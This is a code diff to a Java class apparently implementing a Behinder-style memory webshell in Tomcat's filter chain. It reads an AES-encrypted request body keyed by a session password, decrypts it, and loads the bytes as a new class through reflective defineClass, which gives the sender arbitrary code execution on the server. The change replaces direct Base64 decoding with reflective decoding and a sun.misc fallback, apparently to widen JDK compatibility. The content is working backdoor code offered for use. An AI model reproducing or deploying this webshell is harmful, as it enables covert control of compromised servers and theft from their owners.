@@ -11,7 +11,6 @@ import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -55,7 +54,19 @@ public class TomcatFilterChainBehinderAdvisor {
                 session.setAttribute("u", pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
-                byte[] bytes = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));
+                byte[] data = null;
+                Class<?> base64;
+                String parameter = req.getReader().readLine();
+                try {
+                    base64 = Class.forName("java.util.Base64");
+                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
+                } catch (Exception var6) {
+                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    Object decoder = base64.newInstance();
+                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
+                }
+                byte[] bytes = c.doFinal(data);
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                 defineClass.setAccessible(true);
                 Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
